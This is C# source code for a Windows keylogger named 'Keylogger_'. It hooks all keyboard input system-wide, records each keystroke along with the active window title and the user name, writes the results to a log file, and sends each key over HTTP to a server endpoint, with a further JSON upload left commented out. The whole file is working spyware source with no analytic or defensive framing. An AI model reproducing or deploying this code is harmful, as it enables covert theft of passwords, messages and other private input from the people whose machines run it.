using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Diagnostics;
using System.Threading;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net.Http;

namespace Keylogger_
{
    partial class Program
    {
        public static string logName = Path.Combine(Environment.CurrentDirectory, $"klogs.{DateTime.Now.ToShortDateString()}_{DateTime.Now.ToShortTimeString().Replace(":", ".")}.log");
        public static string lastTitle = "";
        public static string lastTitle1 = "";
        public static string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr SetWindowsHookEx(HookType hookType, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        // overload for use with LowLevelKeyboardProc
        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, WM wParam, [In] KBDLLHOOKSTRUCT lParam);

        // overload for use with LowLevelMouseProc
        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, WM wParam, [In] MSLLHOOKSTRUCT lParam);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool PeekMessage(IntPtr lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax, uint wRemoveMsg);

        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
        
        

        delegate IntPtr HookProc(int code, IntPtr wParam, IntPtr lParam);

        [StructLayout(LayoutKind.Sequential)]
        public struct NativeMessage
        {
            public IntPtr handle;
            public uint msg;
            public IntPtr wParam;
            public IntPtr lParam;
            public uint time;
            public System.Drawing.Point p;
        }


        public enum HookType : int
        {
            WH_JOURNALRECORD = 0,
            WH_JOURNALPLAYBACK = 1,
            WH_KEYBOARD = 2,
            WH_GETMESSAGE = 3,
            WH_CALLWNDPROC = 4,
            WH_CBT = 5,
            WH_SYSMSGFILTER = 6,
            WH_MOUSE = 7,
            WH_HARDWARE = 8,
            WH_DEBUG = 9,
            WH_SHELL = 10,
            WH_FOREGROUNDIDLE = 11,
            WH_CALLWNDPROCRET = 12,
            WH_KEYBOARD_LL = 13,
            WH_MOUSE_LL = 14
        }

        [StructLayout(LayoutKind.Sequential)]
        public class KBDLLHOOKSTRUCT
        {
            public uint vkCode;
            public uint scanCode;
            public KBDLLHOOKSTRUCTFlags flags;
            public uint time;
            public UIntPtr dwExtraInfo;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MSLLHOOKSTRUCT
        {
            public POINT pt;
            public int mouseData; // be careful, this must be ints, not uints (was wrong before I changed it...).
            public int flags;
            public int time;
            public UIntPtr dwExtraInfo;
        }

        String lastcpt = "";

        private static IntPtr CallbackFunction(Int32 code, IntPtr wParam, IntPtr lParam)
        {
            Int32 msgType = wParam.ToInt32();
            Int32 vKey;
            string key = "";
            if (code >= 0 && (msgType == 0x100 || msgType == 0x104))
            {
                bool shift = false;
                IntPtr hWindow = GetForegroundWindow();
                short shiftState = GetAsyncKeyState(Keys.ShiftKey);
                if ((shiftState & 0x8000) == 0x8000)
                {
                    shift = true;
                }
                var caps = Console.CapsLock;
                // read virtual key from buffer
                vKey = Marshal.ReadInt32(lParam);
                // Parse key
                if (vKey > 64 && vKey < 91)
                {
                    if (shift | caps)
                    {
                        key = ((Keys)vKey).ToString();
                    }
                    else
                    {
                        key = ((Keys)vKey).ToString().ToLower();
                    }
                }
                else if (vKey >= 96 && vKey <= 111)
                {
                    switch (vKey)
                    {
                        case 96:
                            key = "0";
                            break;
                        case 97:
                            key = "1";
                            break;
                        case 98:
                            key = "2";
                            break;
                        case 99:
                            key = "3";
                            break;
                        case 100:
                            key = "4";
                            break;
                        case 101:
                            key = "5";
                            break;
                        case 102:
                            key = "6";
                            break;
                        case 103:
                            key = "7";
                            break;
                        case 104:
                            key = "8";
                            break;
                        case 105:
                            key = "9";
                            break;
                        case 106:
                            key = "*";
                            break;
                        case 107:
                            key = "+";
                            break;
                        case 108:
                            key = "|";
                            break;
                        case 109:
                            key = "-";
                            break;
                        case 110:
                            key = ".";
                            break;
                        case 111:
                            key = "/";
                            break;
                    } //Special symbols only
                }
                else if ((vKey >= 48 && vKey <= 57) || (vKey >= 186 && vKey <= 192))
                {
                    if (shift)
                    {
                        switch (vKey)
                        {
                            case 48:
                                key = ")";
                                break;
                            case 49:
                                key = "!";
                                break;
                            case 50:
                                key = "@";
                                break;
                            case 51:
                                key = "#";
                                break;
                            case 52:
                                key = "$";
                                break;
                            case 53:
                                key = "%";
                                break;
                            case 54:
                                key = "^";
                                break;
                            case 55:
                                key = "&";
                                break;
                            case 56:
                                key = "*";
                                break;
                            case 57:
                                key = "(";
                                break;
                            case 186:
                                key = ":";
                                break;
                            case 187:
                                key = "+";
                                break;
                            case 188:
                                key = "<";
                                break;
                            case 189:
                                key = "_";
                                break;
                            case 190:
                                key = ">";
                                break;
                            case 191:
                                key = "?";
                                break;
                            case 192:
                                key = "~";
                                break;
                            case 219:
                                key = "{";
                                break;
                            case 220:
                                key = "|";
                                break;
                            case 221:
                                key = "}";
                                break;
                            case 222:
                                key = "\"";
                                break;
                        }
                    }
                    else
                    {
                        switch (vKey)
                        {
                            case 48:
                                key = "0";
                                break;
                            case 49:
                                key = "1";
                                break;
                            case 50:
                                key = "2";
                                break;
                            case 51:
                                key = "3";
                                break;
                            case 52:
                                key = "4";
                                break;
                            case 53:
                                key = "5";
                                break;
                            case 54:
                                key = "6";
                                break;
                            case 55:
                                key = "7";
                                break;
                            case 56:
                                key = "8";
                                break;
                            case 57:
                                key = "9";
                                break;
                            case 186:
                                key = ";";
                                break;
                            case 187:
                                key = "=";
                                break;
                            case 188:
                                key = ",";
                                break;
                            case 189:
                                key = "-";
                                break;
                            case 190:
                                key = ".";
                                break;
                            case 191:
                                key = "/";
                                break;
                            case 192:
                                key = "`";
                                break;
                            case 219:
                                key = "[";
                                break;
                            case 220:
                                key = "\\";
                                break;
                            case 221:
                                key = "]";
                                break;
                            case 222:
                                key = "'";
                                break;
                        }
                    }
                }
                else
                {
                    switch ((Keys)vKey)
                    {
                        case Keys.F1:
                            key = "<F1>";
                            break;
                        case Keys.F2:
                            key = "<F2>";
                            break;
                        case Keys.F3:
                            key = "<F3>";
                            break;
                        case Keys.F4:
                            key = "<F4>";
                            break;
                        case Keys.F5:
                            key = "<F5>";
                            break;
                        case Keys.F6:
                            key = "<F6>";
                            break;
                        case Keys.F7:
                            key = "<F7>";
                            break;
                        case Keys.F8:
                            key = "<F8>";
                            break;
                        case Keys.F9:
                            key = "<F9>";
                            break;
                        case Keys.F10:
                            key = "<F10>";
                            break;
                        case Keys.F11:
                            key = "<F11>";
                            break;
                        case Keys.F12:
                            key = "<F12>";
                            break;

                        //case Keys.Snapshot:
                        //    key = "<Print Screen>";
                        //    break;
                        //case Keys.Scroll:
                        //    key = "<Scroll Lock>";
                        //    break;
                        //case Keys.Pause:
                        //    key = "<Pause/Break>";
                        //    break;
                        case Keys.Insert:
                            key = "<Insert>";
                            break;
                        //case Keys.Home:
                        //    key = "<Home>";
                        //    break;
                        case Keys.Delete:
                            key = "<Delete>";
                            break;
                        //case Keys.End:
                        //    key = "<End>";
                        //    break;
                        //case Keys.Prior:
                        //    key = "<Page Up>";
                        //    break;
                        //case Keys.Next:
                        //    key = "<Page Down>";
                        //    break;
                        //case Keys.Escape:
                        //    key = "<Esc>";
                        //    break;
                        //case Keys.NumLock:
                        //    key = "<Num Lock>";
                        //    break;
                        //case Keys.Capital:
                        //    key = "<Caps Lock>";
                        //    break;
                        case Keys.Tab:
                            key = "<Tab>";
                            break;
                        case Keys.Back:
                            key = "<Backspace>";
                            break;
                        case Keys.Enter:
                            key = "<Enter>";
                            break;
                        case Keys.Space:
                            key = " ";
                            break;
                        case Keys.Left:
                            key = "<Left>";
                            break;
                        case Keys.Up:
                            key = "<Up>";
                            break;
                        case Keys.Right:
                            key = "<Right>";
                            break;
                        case Keys.Down:
                            key = "<Down>";
                            break;
                        case Keys.LMenu:
                            key = "<Alt>";
                            break;
                        case Keys.RMenu:
                            key = "<Alt>";
                            break;
                        case Keys.LWin:
                            key = "<Windows Key>";
                            break;
                        case Keys.RWin:
                            key = "<Windows Key>";
                            break;
                        //case Keys.LShiftKey:
                        //    key = "<Shift>";
                        //    break;
                        //case Keys.RShiftKey:
                        //    key = "<Shift>";
                        //    break;
                        case Keys.LControlKey:
                            key = "<Ctrl>";
                            break;
                        case Keys.RControlKey:
                            key = "<Ctrl>";
                            break;
                    }
                }
                StringBuilder title = new StringBuilder(256);
                GetWindowText(hWindow, title, title.Capacity);

                Dictionary<string, string> props = new Dictionary<string, string>();
                props["Key"] = key;
                props["Time"] = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss tt");
                props["Window"] = title.ToString();
                if (props["Window"] != Program.lastTitle)
                {
                    string titleString = "====================================LOG RECORD START====================================" + Environment.NewLine +
                                            "User    : " + Program.userName + Environment.NewLine +
                                            "Window  : " + props["Window"] + Environment.NewLine +
                                            "Time    : " + props["Time"] + Environment.NewLine +
                                            "LogFile : " + Program.logName + Environment.NewLine +
                                            "----------------------------------------------" + Environment.NewLine +
                                            "Log data: \r\n";
                    Trace.WriteLine("");
                    Trace.WriteLine("");
                    Trace.WriteLine(titleString);
                    Trace.WriteLine("");
                    GC.Collect();
                    Program.lastTitle = props["Window"];
                }
                Trace.Write(props["Key"]);

                


                using (System.Net.Http.HttpClient client = new System.Net.Http.HttpClient())
                {

                    string logEntry = "HELL!!!"; // Ваша текстовая строка для отправки
                    //var content = new StringContent(logEntry, Encoding.UTF8, "text/plain"); // Устанавливаем Content-Type заголовок
                    string s = client.GetAsync($"http://localhost:34467/weatherforecast/SetLog?logEntry={props["Key"]}&window={props["Window"]}&time={props["Time"]}")
                         .GetAwaiter().GetResult().Content.ReadAsStringAsync().GetAwaiter().GetResult();

                    // Дополнительная обработка ответа сервера, если необходимо asdasdasdghjvwwwwwwaadasdad


                    /*string window = props["Window"];
                    string key1;
                    string time = props["Time"];
                    string logFile = Program.logName;



                     if (window != Program.lastTitle1)
                     {
                         string jsonData = $"[ {{ \"Window\": \"{window}\", \"Keys\" : [\"{key}\"] }} ]";
                         StringContent content = new StringContent(jsonData, Encoding.UTF8, "application/json");
                         string s = client.PostAsync("http://localhost:34467/weatherforecast/setdata", content).
                         GetAwaiter().GetResult().Content.ReadAsStringAsync().GetAwaiter().GetResult();

                     }
                     else
                     {


                     }

                       qwertyrwe1123qwer11
                         string jsonData = $"[ {{ \"Window\": \"{window}\", \"Keys\": [\"{key}\"], \"Time\": \"{time}\", \"LogFile\": \"{logFile}\" }} ]"
                     */
                }
            }
                return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
        }
       
        public static void Main(string[] args)
        {
            //string directoryPath = Environment.CurrentDirectory;
            //int portNumber = 8080;
            //KeyLogger_.SimpleHTTPServer server = new KeyLogger_.SimpleHTTPServer(directoryPath);
            try
            {
                Trace.Listeners.Clear();
                TextWriterTraceListener twtl = new TextWriterTraceListener(Program.logName);
                twtl.Name = "TextLogger";
                twtl.TraceOutputOptions = TraceOptions.ThreadId | TraceOptions.DateTime;

                ConsoleTraceListener ctl = new ConsoleTraceListener(false);
                ctl.TraceOutputOptions = TraceOptions.DateTime;

                Trace.Listeners.Add(twtl);
                Trace.Listeners.Add(ctl);
                Trace.AutoFlush = true;

                
                // Start the clipboard
                //Thread clipboardT = new Thread(new ThreadStart(delegate { Application.Run(new ClipboardMonitorForm()); }));
                //clipboardT.Start();

                //Application.Run(new ClipboardNotification.NotificationForm());
                HookProc callback = CallbackFunction;
                var module = Process.GetCurrentProcess().MainModule.ModuleName;
                var moduleHandle = GetModuleHandle(module);
                var hook = SetWindowsHookEx(HookType.WH_KEYBOARD_LL, callback, moduleHandle, 0);

                while (true)
                {
                    PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
                    System.Threading.Thread.Sleep(5);
                }
                
            }
            catch (Exception ex)
            {
                Console.WriteLine("[ERROR] Exception: {0}", ex);
            }
        }
    }
}
